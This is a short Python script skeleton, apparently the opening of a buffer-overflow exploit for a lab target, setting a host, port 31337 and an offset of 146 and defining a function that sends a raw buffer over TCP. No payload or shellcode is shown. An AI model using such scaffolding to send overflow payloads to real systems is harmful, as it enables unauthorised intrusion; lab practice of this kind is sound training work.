import socket

host = "192.168.209.10" # Change This
port = 31337 # Change This

offset = 146 # Offset value. Change if neccesary


def send_payload(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(buffer)
    print(s.recv(1024))
    s.close()